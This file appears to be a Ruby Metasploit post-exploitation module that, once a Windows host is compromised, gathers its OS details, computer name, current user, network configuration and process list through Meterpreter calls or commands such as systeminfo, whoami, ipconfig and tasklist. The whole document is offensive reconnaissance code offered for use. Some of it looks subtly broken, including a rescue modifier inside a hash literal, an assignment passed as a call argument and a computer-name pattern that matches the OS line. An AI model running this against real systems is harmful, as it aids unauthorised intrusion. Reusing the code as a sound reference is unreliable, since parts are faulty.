require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::User
  include Msf::Post::Windows::Network
  include Msf::Post::Windows::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Information Gathering',
      'Description'   => %q{
        Gathers OS information, current user, network configuration and running processes
        from a compromised Windows host. Supports Meterpreter and command shell sessions.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Jose Mayo'],
      'Platform'      => ['windows'],
      'SessionTypes'  => ['meterpreter', 'shell']
    ))

    register_options(
      [
        OptInt.new('TIMEOUT', [ true, 'Command/network timeout in seconds', 10 ])
      ]
    )
  end

  def run
    unless session
      print_error("No session available")
      return
    end

    target_host = session.tunnel_peer ? session.tunnel_peer : session.session_host
    print_status("Gathering system information from #{target_host}")

    begin
      system_info = gather_system_info
      user_info   = gather_user_info
      network     = gather_network_info
      procs       = gather_running_processes

      # Print structured output
      print_line("\n=== Gathered Information for #{target_host} ===")
      if system_info
        print_line("[*] OS: #{system_info[:os_info]}")
        print_line("[*] Computer: #{system_info[:computer_name]}")
        print_line("[*] Architecture: #{system_info[:architecture]}") if system_info[:architecture]
      else
        print_line("[*] OS: (not available)")
      end

      if user_info
        print_line("[*] User: #{user_info[:user]}")
      else
        print_line("[*] User: (not available)")
      end

      if network && network.any?
        network.each do |iface|
          # iface expected to be a hash with :name, :ip, :netmask, :gateway
          name = iface[:name] || iface[:description] || 'Interface'
          ip   = iface[:ip] || 'N/A'
          nm   = iface[:netmask] || 'N/A'
          gw   = iface[:gateway] || 'N/A'
          print_line("[*] Interface: #{name}, IP: #{ip}, Netmask: #{nm}, Gateway: #{gw}")
        end
      else
        print_line("[*] Network: (no interfaces found or not retrievable)")
      end

      if procs && procs.any?
        procs.each do |p|
          print_line("[*] Process #{p[:pid]} - #{p[:name]}")
        end
      else
        print_line("[*] Processes: (none found or not retrievable)")
      end

      print_line("=== End of report ===\n")
    rescue ::Exception => e
      print_error("Module failed: #{e.class} #{e}")
      vprint_error(e.backtrace.join("\n"))
    end
  end

  #
  # Helper: gather_system_info
  # Returns hash {:os_info, :computer_name, :architecture}
  #
  def gather_system_info
    if meterpreter_session?
      begin
        # Use Meterpreter's sysinfo where available
        si = session.sys.config.sysinfo rescue nil
        if si && si.is_a?(Hash)
          return {
            os_info: si['OS'] || si['os'] || si['ProductName'] || si['buildnumber'] || si.inspect,
            computer_name: si['Computer'] || si['ComputerName'] || session.sys.config.getcomputername rescue nil,
            architecture: si['Architecture'] || si['arch']
          }
        else
          # Some meterpreter builds expose sysinfo differently
          begin
            os = session.sys.config.sysinfo['OS']
            cn = session.sys.config.sysinfo['Computer']
            return { os_info: os, computer_name: cn, architecture: nil }
          rescue ::Exception
            # fallthrough
          end
        end
      rescue ::Exception => e
        vprint_error("Meterpreter sysinfo failed: #{e.class} #{e}")
      end
    end

    # Fallback: shell session - run systeminfo and parse a few lines
    begin
      out = cmd_exec('systeminfo')
      os_line = out.each_line.find { |l| l =~ /OS Name|OS Version/ }
      cn_line = out.each_line.find { |l| l =~ /Host Name|System Name|OS Name/ }
      os_txt  = os_line ? os_line.split(':',2)[1].to_s.strip : 'Unknown'
      cn_txt  = cn_line ? cn_line.split(':',2)[1].to_s.strip : (session.shell_command_token('echo %COMPUTERNAME%').strip rescue nil)
      return { os_info: os_txt, computer_name: cn_txt, architecture: nil }
    rescue ::Exception => e
      vprint_error("systeminfo fallback failed: #{e.class} #{e}")
      return nil
    end
  end

  #
  # Helper: gather_user_info
  # Returns hash {:user}
  #
  def gather_user_info
    if meterpreter_session?
      begin
        user = session.sys.config.getuid rescue nil
        # getuid sometimes returns a string or a hash
        if user.is_a?(Hash) && user['user']
          return { user: user['user'] }
        elsif user.is_a?(String)
          return { user: user }
        end
      rescue ::Exception => e
        vprint_error("Meterpreter getuid failed: #{e.class} #{e}")
      end
    end

    # Fallback shell
    begin
      who = cmd_exec('whoami').to_s.strip
      return { user: who } if who && !who.empty?
    rescue ::Exception => e
      vprint_error("whoami fallback failed: #{e.class} #{e}")
    end

    return nil
  end

  #
  # Helper: gather_network_info
  # Returns array of interfaces [{:name, :ip, :netmask, :gateway}]
  #
  def gather_network_info
    if meterpreter_session?
      begin
        # Attempt to use meterpreter's network interfaces
        if session.respond_to?(:net) && session.net.respond_to?(:config) && session.net.config.respond_to?(:interfaces)
          ifaces = session.net.config.interfaces
          results = []
          ifaces.each do |k, v|
            # v is typically a hash with addresses
            name = v['name'] || v['description'] || k
            ip   = v['ip'] || v['address'] || (v['ipv4'] rescue nil)
            nm   = v['netmask'] || v['netmask_v4']
            gw   = v['gateway'] || v['gateway_v4']
            results << { name: name, ip: ip, netmask: nm, gateway: gw }
          end
          return results
        end
      rescue ::Exception => e
        vprint_error("Meterpreter network interface gather failed: #{e.class} #{e}")
      end
    end

    # Fallback: shell - use ipconfig and parse IPv4 addresses (simple heuristic)
    begin
      out = cmd_exec('ipconfig /all')
      interfaces = []
      current = nil
      out.each_line do |line|
        line = line.chomp
        if line =~ /^\s*Ethernet adapter (.+):/
          current = { name: $1.strip }
          interfaces << current
        elsif line =~ /^\s*Adapter (.+):/i
          current = { name: $1.strip }
          interfaces << current
        elsif current && line =~ /IPv4 Address[.\s]*:\s*([\d\.]+)/
          current[:ip] = $1
        elsif current && line =~ /Subnet Mask[.\s]*:\s*([\d\.]+)/
          current[:netmask] = $1
        elsif current && line =~ /Default Gateway[.\s]*:\s*([\d\.]+)/
          current[:gateway] = $1
        end
      end
      return interfaces
    rescue ::Exception => e
      vprint_error("ipconfig fallback failed: #{e.class} #{e}")
      return []
    end
  end

  #
  # Helper: gather_running_processes
  # Returns array [{:pid, :name}]
  #
  def gather_running_processes
    results = []
    if meterpreter_session?
      begin
        procs = session.sys.process.get_processes rescue nil
        if procs && procs.is_a?(Array)
          procs.each do |p|
            pid = p['pid'] || p['PID'] || p[:pid] rescue nil
            name = p['name'] || p['Name'] || p['process_name'] rescue nil
            results << { pid: pid, name: name } if pid && name
          end
          return results
        end
      rescue ::Exception => e
        vprint_error("Meterpreter process list failed: #{e.class} #{e}")
      end
    end

    # Fallback: shell - tasklist
    begin
      out = cmd_exec('tasklist /FO CSV /NH')
      out.each_line do |line|
        # CSV format: "Image Name","PID","Session Name","Session#","Mem Usage"
        cols = line.strip.split('","').map { |c| c.gsub(/^\"|\"$/, '') }
        next if cols.length < 2
        name = cols[0]
        pid  = cols[1]
        results << { pid: pid.to_i, name: name }
      end
      return results
    rescue ::Exception => e
      vprint_error("tasklist fallback failed: #{e.class} #{e}")
      return []
    end
  end

  #
  # Utility: is this a Meterpreter session?
  #
  def meterpreter_session?
    return false unless session
    session.type == 'meterpreter'
  end

  #
  # Utility: execute a shell command and return output (works for shell and meterpreter)
  #
  def cmd_exec(cmd)
    # For meterpreter, prefer stdapi's shell.exec
    if meterpreter_session?
      begin
        return session.shell_command_token(cmd, timeout = datastore['TIMEOUT'].to_i) # shell_command_token available in some MSF versions
      rescue ::Exception
        # fallback to session.shell.process.execute
        begin
          out = ''
          session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true}) do |ch|
            ch.on_output { |c| out << c }
            ch.on_readable { out << ch.read_nonblock rescue nil }
          end
          return out
        rescue ::Exception => e
          vprint_error("meterpreter cmd_exec fallback failed: #{e.class} #{e}")
        end
      end
    end

    # For shell sessions (session.shell)
    if session.respond_to?(:shell_read) && session.respond_to?(:shell_write)
      # Use the session's shell helpers if available
      begin
        return session.shell_command_token(cmd, datastore['TIMEOUT'].to_i)
      rescue ::Exception => e
        vprint_error("shell cmd_exec failed: #{e.class} #{e}")
      end
    end

    # Last resort: try `session.shell_command`
    if session.respond_to?(:shell_command)
      begin
        return session.shell_command(cmd, datastore['TIMEOUT'].to_i)
      rescue ::Exception => e
        vprint_error("final cmd_exec attempt failed: #{e.class} #{e}")
      end
    end

    raise "Unable to execute command on session (no suitable method available)"
  end
end
